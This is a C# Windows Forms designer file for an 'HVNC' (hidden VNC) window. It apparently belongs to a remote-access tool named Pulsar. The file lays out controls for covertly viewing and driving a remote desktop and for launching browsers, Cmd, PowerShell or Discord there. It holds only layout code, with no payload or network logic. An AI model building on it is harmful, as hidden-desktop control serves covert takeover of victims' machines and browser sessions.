﻿using Pulsar.Server.Controls;

namespace Pulsar.Server.Forms
{
    partial class FrmHVNC
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmHVNC));
            this.btnStart = new System.Windows.Forms.Button();
            this.btnStop = new System.Windows.Forms.Button();
            this.barQuality = new System.Windows.Forms.TrackBar();
            this.lblQuality = new System.Windows.Forms.Label();
            this.lblQualityShow = new System.Windows.Forms.Label();
            this.btnMouse = new System.Windows.Forms.Button();
            this.panelTop = new System.Windows.Forms.Panel();
            this.dropDownMenuButton = new Pulsar.Server.Controls.MenuButton();
            this.contextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.menuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.menuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.startEdgeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startBraveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startOperaToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startOperaGXToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startFirefoxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startCmdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startPowershellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startDiscordToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startCustomPathToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sizeLabelCounter = new System.Windows.Forms.Label();
            this.btnKeyboard = new System.Windows.Forms.Button();
            this.cbMonitors = new System.Windows.Forms.ComboBox();
            this.btnHide = new System.Windows.Forms.Button();
            this.btnShow = new System.Windows.Forms.Button();
            this.toolTipButtons = new System.Windows.Forms.ToolTip(this.components);
            this.picDesktop = new Pulsar.Server.Controls.HVNCRapidPictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.barQuality)).BeginInit();
            this.panelTop.SuspendLayout();
            this.contextMenuStrip.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.picDesktop)).BeginInit();
            this.SuspendLayout();
            // 
            // btnStart
            // 
            this.btnStart.Location = new System.Drawing.Point(11, 3);
            this.btnStart.Name = "btnStart";
            this.btnStart.Size = new System.Drawing.Size(68, 28);
            this.btnStart.TabIndex = 1;
            this.btnStart.TabStop = false;
            this.btnStart.Text = "Start";
            this.btnStart.UseVisualStyleBackColor = true;
            this.btnStart.Click += new System.EventHandler(this.btnStart_Click);
            // 
            // btnStop
            // 
            this.btnStop.Enabled = false;
            this.btnStop.Location = new System.Drawing.Point(85, 3);
            this.btnStop.Name = "btnStop";
            this.btnStop.Size = new System.Drawing.Size(68, 28);
            this.btnStop.TabIndex = 2;
            this.btnStop.TabStop = false;
            this.btnStop.Text = "Stop";
            this.btnStop.UseVisualStyleBackColor = true;
            this.btnStop.Click += new System.EventHandler(this.btnStop_Click);
            // 
            // barQuality
            // 
            this.barQuality.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.barQuality.Location = new System.Drawing.Point(456, 3);
            this.barQuality.Maximum = 100;
            this.barQuality.Minimum = 1;
            this.barQuality.Name = "barQuality";
            this.barQuality.Size = new System.Drawing.Size(76, 45);
            this.barQuality.TabIndex = 3;
            this.barQuality.TabStop = false;
            this.barQuality.Value = 75;
            this.barQuality.Scroll += new System.EventHandler(this.barQuality_Scroll);
            // 
            // lblQuality
            // 
            this.lblQuality.AutoSize = true;
            this.lblQuality.Location = new System.Drawing.Point(404, 5);
            this.lblQuality.Name = "lblQuality";
            this.lblQuality.Size = new System.Drawing.Size(46, 13);
            this.lblQuality.TabIndex = 4;
            this.lblQuality.Text = "Quality:";
            // 
            // lblQualityShow
            // 
            this.lblQualityShow.AutoSize = true;
            this.lblQualityShow.Location = new System.Drawing.Point(404, 18);
            this.lblQualityShow.Name = "lblQualityShow";
            this.lblQualityShow.Size = new System.Drawing.Size(52, 13);
            this.lblQualityShow.TabIndex = 5;
            this.lblQualityShow.Text = "75 (high)";
            // 
            // btnMouse
            // 
            this.btnMouse.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btnMouse.Image = global::Pulsar.Server.Properties.Resources.mouse_delete;
            this.btnMouse.Location = new System.Drawing.Point(626, 3);
            this.btnMouse.Name = "btnMouse";
            this.btnMouse.Size = new System.Drawing.Size(28, 28);
            this.btnMouse.TabIndex = 6;
            this.btnMouse.TabStop = false;
            this.toolTipButtons.SetToolTip(this.btnMouse, "Enable mouse input.");
            this.btnMouse.UseVisualStyleBackColor = true;
            this.btnMouse.Click += new System.EventHandler(this.btnMouse_Click);
            // 
            // panelTop
            // 
            this.panelTop.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.panelTop.Controls.Add(this.dropDownMenuButton);
            this.panelTop.Controls.Add(this.sizeLabelCounter);
            this.panelTop.Controls.Add(this.btnKeyboard);
            this.panelTop.Controls.Add(this.cbMonitors);
            this.panelTop.Controls.Add(this.btnHide);
            this.panelTop.Controls.Add(this.lblQualityShow);
            this.panelTop.Controls.Add(this.btnMouse);
            this.panelTop.Controls.Add(this.btnStart);
            this.panelTop.Controls.Add(this.btnStop);
            this.panelTop.Controls.Add(this.lblQuality);
            this.panelTop.Controls.Add(this.barQuality);
            this.panelTop.Dock = System.Windows.Forms.DockStyle.Top;
            this.panelTop.Location = new System.Drawing.Point(0, 0);
            this.panelTop.Name = "panelTop";
            this.panelTop.Size = new System.Drawing.Size(784, 36);
            this.panelTop.TabIndex = 7;
            // 
            // dropDownMenuButton
            // 
            this.dropDownMenuButton.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.dropDownMenuButton.Location = new System.Drawing.Point(538, 3);
            this.dropDownMenuButton.Menu = this.contextMenuStrip;
            this.dropDownMenuButton.Name = "dropDownMenuButton";
            this.dropDownMenuButton.Size = new System.Drawing.Size(82, 28);
            this.dropDownMenuButton.TabIndex = 12;
            this.dropDownMenuButton.Text = "Menu";
            this.dropDownMenuButton.UseVisualStyleBackColor = true;
            // 
            // contextMenuStrip
            // 
            this.contextMenuStrip.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.contextMenuStrip.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.contextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.menuItem1,
            this.menuItem2,
            this.startEdgeToolStripMenuItem,
            this.startBraveToolStripMenuItem,
            this.startOperaToolStripMenuItem,
            this.startOperaGXToolStripMenuItem,
            this.startFirefoxToolStripMenuItem,
            this.startCmdToolStripMenuItem,
            this.startPowershellToolStripMenuItem,
            this.startDiscordToolStripMenuItem,
            this.startCustomPathToolStripMenuItem});
            this.contextMenuStrip.Name = "contextMenuStrip";
            this.contextMenuStrip.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
            this.contextMenuStrip.Size = new System.Drawing.Size(181, 268);
            // 
            // menuItem1
            // 
            this.menuItem1.ForeColor = System.Drawing.SystemColors.Control;
            this.menuItem1.Name = "menuItem1";
            this.menuItem1.Size = new System.Drawing.Size(180, 22);
            this.menuItem1.Text = "Start Explorer";
            this.menuItem1.Click += new System.EventHandler(this.menuItem1_Click);
            // 
            // menuItem2
            // 
            this.menuItem2.ForeColor = System.Drawing.SystemColors.Control;
            this.menuItem2.Name = "menuItem2";
            this.menuItem2.Size = new System.Drawing.Size(180, 22);
            this.menuItem2.Text = "Start Chrome";
            this.menuItem2.Click += new System.EventHandler(this.menuItem2_Click);
            // 
            // startEdgeToolStripMenuItem
            // 
            this.startEdgeToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.startEdgeToolStripMenuItem.Name = "startEdgeToolStripMenuItem";
            this.startEdgeToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.startEdgeToolStripMenuItem.Text = "Start Edge";
            this.startEdgeToolStripMenuItem.Click += new System.EventHandler(this.startEdgeToolStripMenuItem_Click);
            // 
            // startBraveToolStripMenuItem
            // 
            this.startBraveToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.startBraveToolStripMenuItem.Name = "startBraveToolStripMenuItem";
            this.startBraveToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.startBraveToolStripMenuItem.Text = "Start Brave";
            this.startBraveToolStripMenuItem.Click += new System.EventHandler(this.startBraveToolStripMenuItem_Click);
            // 
            // startOperaToolStripMenuItem
            // 
            this.startOperaToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.startOperaToolStripMenuItem.Name = "startOperaToolStripMenuItem";
            this.startOperaToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.startOperaToolStripMenuItem.Text = "Start Opera";
            this.startOperaToolStripMenuItem.Click += new System.EventHandler(this.startOperaToolStripMenuItem_Click);
            // 
            // startOperaGXToolStripMenuItem
            // 
            this.startOperaGXToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.startOperaGXToolStripMenuItem.Name = "startOperaGXToolStripMenuItem";
            this.startOperaGXToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.startOperaGXToolStripMenuItem.Text = "Start OperaGX";
            this.startOperaGXToolStripMenuItem.Click += new System.EventHandler(this.startOperaGXToolStripMenuItem_Click);
            // 
            // startFirefoxToolStripMenuItem
            // 
            this.startFirefoxToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.startFirefoxToolStripMenuItem.Name = "startFirefoxToolStripMenuItem";
            this.startFirefoxToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.startFirefoxToolStripMenuItem.Text = "Start Firefox";
            this.startFirefoxToolStripMenuItem.Click += new System.EventHandler(this.startFirefoxToolStripMenuItem_Click);
            // 
            // startCmdToolStripMenuItem
            // 
            this.startCmdToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.startCmdToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.startCmdToolStripMenuItem.Name = "startCmdToolStripMenuItem";
            this.startCmdToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.startCmdToolStripMenuItem.Text = "Start Cmd";
            this.startCmdToolStripMenuItem.Click += new System.EventHandler(this.startCmdToolStripMenuItem_Click);
            // 
            // startPowershellToolStripMenuItem
            // 
            this.startPowershellToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.startPowershellToolStripMenuItem.Name = "startPowershellToolStripMenuItem";
            this.startPowershellToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.startPowershellToolStripMenuItem.Text = "Start Powershell";
            this.startPowershellToolStripMenuItem.Click += new System.EventHandler(this.startPowershellToolStripMenuItem_Click);
            // 
            // startDiscordToolStripMenuItem
            // 
            this.startDiscordToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.startDiscordToolStripMenuItem.Name = "startDiscordToolStripMenuItem";
            this.startDiscordToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.startDiscordToolStripMenuItem.Text = "Start Discord";
            this.startDiscordToolStripMenuItem.Click += new System.EventHandler(this.startDiscordToolStripMenuItem_Click);
            // 
            // startCustomPathToolStripMenuItem
            // 
            this.startCustomPathToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.startCustomPathToolStripMenuItem.Name = "startCustomPathToolStripMenuItem";
            this.startCustomPathToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.startCustomPathToolStripMenuItem.Text = "Start Custom Path";
            this.startCustomPathToolStripMenuItem.Click += new System.EventHandler(this.startCustomPathToolStripMenuItem_Click);
            // 
            // sizeLabelCounter
            // 
            this.sizeLabelCounter.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.sizeLabelCounter.Location = new System.Drawing.Point(694, 11);
            this.sizeLabelCounter.Name = "sizeLabelCounter";
            this.sizeLabelCounter.Size = new System.Drawing.Size(77, 15);
            this.sizeLabelCounter.TabIndex = 11;
            this.sizeLabelCounter.Text = "Size: ";
            // 
            // btnKeyboard
            // 
            this.btnKeyboard.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btnKeyboard.Image = global::Pulsar.Server.Properties.Resources.keyboard_delete;
            this.btnKeyboard.Location = new System.Drawing.Point(660, 3);
            this.btnKeyboard.Name = "btnKeyboard";
            this.btnKeyboard.Size = new System.Drawing.Size(28, 28);
            this.btnKeyboard.TabIndex = 9;
            this.btnKeyboard.TabStop = false;
            this.toolTipButtons.SetToolTip(this.btnKeyboard, "Enable keyboard input.");
            this.btnKeyboard.UseVisualStyleBackColor = true;
            this.btnKeyboard.Click += new System.EventHandler(this.btnKeyboard_Click);
            // 
            // cbMonitors
            // 
            this.cbMonitors.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cbMonitors.FormattingEnabled = true;
            this.cbMonitors.Items.AddRange(new object[] {
            "Display 0"});
            this.cbMonitors.Location = new System.Drawing.Point(159, 5);
            this.cbMonitors.Name = "cbMonitors";
            this.cbMonitors.Size = new System.Drawing.Size(180, 21);
            this.cbMonitors.TabIndex = 8;
            this.cbMonitors.TabStop = false;
            // 
            // btnHide
            // 
            this.btnHide.Location = new System.Drawing.Point(344, 3);
            this.btnHide.Name = "btnHide";
            this.btnHide.Size = new System.Drawing.Size(54, 28);
            this.btnHide.TabIndex = 7;
            this.btnHide.TabStop = false;
            this.btnHide.Text = "Hide";
            this.btnHide.UseVisualStyleBackColor = true;
            this.btnHide.Click += new System.EventHandler(this.btnHide_Click);
            // 
            // btnShow
            // 
            this.btnShow.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.btnShow.Location = new System.Drawing.Point(730, 534);
            this.btnShow.Name = "btnShow";
            this.btnShow.Size = new System.Drawing.Size(54, 28);
            this.btnShow.TabIndex = 8;
            this.btnShow.TabStop = false;
            this.btnShow.Text = "Show";
            this.btnShow.UseVisualStyleBackColor = true;
            this.btnShow.Visible = false;
            this.btnShow.Click += new System.EventHandler(this.btnShow_Click);
            // 
            // picDesktop
            // 
            this.picDesktop.BackColor = System.Drawing.Color.Black;
            this.picDesktop.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.picDesktop.Cursor = System.Windows.Forms.Cursors.Default;
            this.picDesktop.Dock = System.Windows.Forms.DockStyle.Fill;
            this.picDesktop.GetImageSafe = null;
            this.picDesktop.Location = new System.Drawing.Point(0, 0);
            this.picDesktop.Name = "picDesktop";
            this.picDesktop.Running = false;
            this.picDesktop.Size = new System.Drawing.Size(784, 562);
            this.picDesktop.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.picDesktop.TabIndex = 0;
            this.picDesktop.TabStop = false;
            // 
            // FrmHVNC
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
            this.ClientSize = new System.Drawing.Size(784, 562);
            this.Controls.Add(this.btnShow);
            this.Controls.Add(this.panelTop);
            this.Controls.Add(this.picDesktop);
            this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.KeyPreview = true;
            this.MinimumSize = new System.Drawing.Size(640, 480);
            this.Name = "FrmHVNC";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "HVNC []";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmRemoteDesktop_FormClosing);
            this.Load += new System.EventHandler(this.FrmRemoteDesktop_Load);
            this.Resize += new System.EventHandler(this.FrmRemoteDesktop_Resize);
            ((System.ComponentModel.ISupportInitialize)(this.barQuality)).EndInit();
            this.panelTop.ResumeLayout(false);
            this.panelTop.PerformLayout();
            this.contextMenuStrip.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.picDesktop)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Button btnStart;
        private System.Windows.Forms.Button btnStop;
        private System.Windows.Forms.TrackBar barQuality;
        private System.Windows.Forms.Label lblQuality;
        private System.Windows.Forms.Label lblQualityShow;
        private System.Windows.Forms.Button btnMouse;
        private System.Windows.Forms.Panel panelTop;
        private System.Windows.Forms.Button btnHide;
        private System.Windows.Forms.Button btnShow;
        private System.Windows.Forms.ComboBox cbMonitors;
        private System.Windows.Forms.Button btnKeyboard;
        private System.Windows.Forms.ToolTip toolTipButtons;
        private Controls.HVNCRapidPictureBox picDesktop;
        private System.Windows.Forms.Label sizeLabelCounter;
        private Controls.MenuButton dropDownMenuButton;
        private System.Windows.Forms.ContextMenuStrip contextMenuStrip;
        private System.Windows.Forms.ToolStripMenuItem menuItem1;
        private System.Windows.Forms.ToolStripMenuItem menuItem2;
        private System.Windows.Forms.ToolStripMenuItem startEdgeToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startBraveToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startOperaToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startFirefoxToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startCmdToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startPowershellToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startCustomPathToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startDiscordToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startOperaGXToolStripMenuItem;
    }
}